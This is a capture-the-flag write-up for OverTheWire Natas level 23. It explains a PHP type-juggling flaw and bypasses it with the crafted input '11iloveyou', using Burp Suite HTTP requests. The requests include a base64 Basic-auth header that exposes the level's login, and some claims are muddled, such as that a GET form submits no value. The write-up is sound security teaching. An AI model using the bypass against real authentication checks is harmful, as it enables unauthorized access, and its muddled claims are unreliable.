# [Over The Wire (natas)] – [[Platform](http://natas23.natas.labs.overthewire.org/)] – [09/29/2025]

## Objective
Find the password for the next Natas level by exploiting the vulnerability on this page.  

## Environment / Platform
- Platform: OverTheWire – Natas
- Level: [23]
- Difficulty: [Easy]

## Tools Used
- Chromium Browser
- Burp Suite (proxy + repeater)

## Login
1. Logged in with credentials:
   - **Username**: `natas23
   - **Password**: `XXXXXX`
  
2. Screenshot:
   ![alt text](image-32.png)
   
   - this prompted that I should check the sourcecode by clicking the link `http://natas23.natas.labs.overthewire.org/index-source.html`

3. Observed Page Content

```php
      if(array_key_exists("passwd",$_REQUEST)){
         if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
               echo "<br>The credentials for the next level are:<br>";
               echo "<pre>Username: natas24 Password: <censored></pre>";
         }
         else{
               echo "<br>Wrong!<br>";
         }
      }
      // morla / 10111
```
   - This function checks if the key "passwd" contains the text "iloveyou" and if the value is longer than 10 characters. If so, the flag will be revealed. If not will display "Wrong!".


---
  

     
4. Steps taken (Improper Type Handling):

   1. First of all I wanted to check what happened with the form when it submits a password. Turns out the form is set to "GET" request and there for doesn't submit a value. 


   ```html

         <form name="input" method="get">
            <input type="text" name="passwd" size=20>
            <input type="submit" value="Login">
         </form>
   ```

   ```
      GET /?passwd=test HTTP/1.1
      Host: natas23.natas.labs.overthewire.org
      Authorization: Basic bmF0YXMyMzpkSVVRY0kzdVN1czFKRU9TU1dSQUVYQkc4S2JSOHRScw==
      Accept-Language: en-US,en;q=0.9
      Upgrade-Insecure-Requests: 1
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
      Referer: http://natas23.natas.labs.overthewire.org/?passwd=test
      Accept-Encoding: gzip, deflate, br
      Connection: keep-alive
   ```

   2. Changing the method of the request and headers, we kept the protocol, Host, Authorization. We added Content-Type and Content-Length as well as the data with the key `passwd`. 

   ```
      POST / HTTP/1.1
      Host: natas23.natas.labs.overthewire.org
      Authorization: Basic bmF0YXMyMzpkSVVRY0kzdVN1czFKRU9TU1dSQUVYQkc4S2JSOHRScw==
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 17

      passwd=iloveyouiloveyouiloveyou
   ```

   3. This returned as `Wrong!`, however did submit. This proved that information was received just that when converted to digit is not > 10. 

   4. If the payload was changed to `11iloveyou`, this produced the flag.
   
   ```html
      The credentials for the next level are:<br><pre>Username: natas24 Password: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</pre>
   ```

   

---

🔑 **Why this works**: 
   - PHP will coerce types when you compare a string to a number ($_REQUEST["passwd"] > 10).

   - If the string starts with digits PHP parses those as the numeric value (e.g. "11abc" → 11).

   - If the string does not start with digits, it becomes 0 (e.g. "abc11" → 0).

   - The code uses strstr() only to check for the substring "iloveyou" (truthy if present) but uses a numeric comparison on the raw input instead of checking length or extracting digits.

   - The developer likely intended to check length > 10, but comparing the raw string to 10 causes the server to accept inputs that begin with a number > 10 (e.g. "11iloveyou"), revealing the flag.

   - In short: incorrect assumption about what > 10 does on a string — leads to logic that can be bypassed by crafting an input whose numeric coercion satisfies the condition.

---

💥 **Impact**

   - **Unauthorized disclosure of sensitive data** (next-level credentials) when an attacker crafts input that satisfies the coerced numeric check.

   - **Bypass of intended access controls** or validation logic that relied on an incorrect type/format assumption.

   - **Low-effort exploitation**: attacker only needs to prepend a number to a payload (or otherwise craft string that coerces > 10) to bypass the check.

   - **Could be used as part of a larger attack chain** (automated scanning, lateral movement in wargame/CTF scenarios) because it’s trivial to test and exploit.

---
  
🛠️ **Remediation**

   **Explicitly check what you mean**:

   - If you mean length, use strlen($passwd) > 10.

   - If you mean numeric value, extract and validate digits explicitly, e.g. if (preg_match('/^\d+/', $passwd, $m) && intval($m[0]) > 10) { ... }.

   **Avoid implicit type juggling**:

   - input types before comparing.

   **Validate and sanitize input**:

   - Use filter_input() / filter_var() or preg_match() to enforce expected format (e.g., only letters, only digits, length ranges).

   **Fail-safe defaults**:

   - If validation fails, deny access and log the attempt. Don’t rely on language coercion semantics for security checks.

   **Code review & tests**:

   - Add unit tests for boundary cases (strings starting with digits, strings with no digits, empty input).

   - Include a static code check or linter rule to flag comparisons between mixed types.

   **Least privilege & output handling**:

   - Don’t reveal sensitive credentials directly in application responses; require stronger authentication/authorization before disclosing secrets.
